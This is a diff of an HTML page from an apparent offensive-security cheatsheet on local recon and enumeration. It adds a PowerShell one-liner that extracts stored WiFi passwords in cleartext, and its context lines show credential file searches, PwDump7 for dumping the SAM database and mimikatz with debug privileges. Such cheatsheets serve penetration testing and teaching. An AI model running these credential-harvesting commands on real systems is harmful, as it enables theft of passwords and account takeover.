@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-10-27T18:01:17 CET">
+<meta name="revised" content="2020-12-21T15:31:51 CET">
 <title>Local Recon and Enumeration :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -462,6 +462,13 @@
         <div>
           <a href="/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/">
             Amazon &amp; Digital Ocean Buckets
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/parler/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/parler/">
+            Parler
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -2093,7 +2100,8 @@ dir /s *pass* <span style="color:#f92672">==</span> *cred* <span style="color:#f
 <span style="color:#75715e"># Interesting files</span>
 C:<span style="color:#8045ff">\u</span>nattend.xml
 C:<span style="color:#8045ff">\s</span>ysprep.inf
-C:<span style="color:#8045ff">\s</span>ysprep<span style="color:#8045ff">\s</span>ysprep.xml</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#8045ff">\P</span>wDump7.exe <span style="color:#f92672">(</span>nécessite libay32.dll<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; Dump SAM base
+C:<span style="color:#8045ff">\s</span>ysprep<span style="color:#8045ff">\s</span>ysprep.xml</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Enumerate stored WiFi settings and get possible stored passwords</span>
+<span style="color:#f92672">(</span>netsh wlan show profiles<span style="color:#f92672">)</span> <span style="color:#111">|</span> Select-String <span style="color:#d88200">&#34;\:(.+)</span>$<span style="color:#d88200">&#34;</span> <span style="color:#111">|</span> %<span style="color:#f92672">{</span><span style="color:#111">$name</span><span style="color:#f92672">=</span><span style="color:#111">$_</span>.Matches.Groups<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>.Value.Trim<span style="color:#f92672">()</span><span style="color:#111">;</span> <span style="color:#111">$_</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> %<span style="color:#f92672">{(</span>netsh wlan show profile <span style="color:#111">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;</span><span style="color:#111">$name</span><span style="color:#d88200">&#34;</span> <span style="color:#111">key</span><span style="color:#f92672">=</span>clear<span style="color:#f92672">)}</span> <span style="color:#111">|</span> Select-String <span style="color:#d88200">&#34;(Key Content|Contenu de la clé)\W+\:(.+)</span>$<span style="color:#d88200">&#34;</span> <span style="color:#111">|</span> %<span style="color:#f92672">{</span><span style="color:#111">$pass</span><span style="color:#f92672">=</span><span style="color:#111">$_</span>.Matches.Groups<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>.Value.Trim<span style="color:#f92672">()</span><span style="color:#111">;</span> <span style="color:#111">$_</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> %<span style="color:#f92672">{[</span>PSCustomObject<span style="color:#f92672">]</span>@<span style="color:#f92672">{</span> <span style="color:#111">PROFILE_NAME</span><span style="color:#f92672">=</span><span style="color:#111">$name</span><span style="color:#111">;</span><span style="color:#111">PASSWORD</span><span style="color:#f92672">=</span><span style="color:#111">$pass</span> <span style="color:#f92672">}}</span> <span style="color:#111">|</span> Format-Table -AutoSize</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#8045ff">\P</span>wDump7.exe <span style="color:#f92672">(</span>nécessite libay32.dll<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; Dump SAM base
 .<span style="color:#8045ff">\m</span>imikatz.exe
     privilege::debug
     privilege::backup
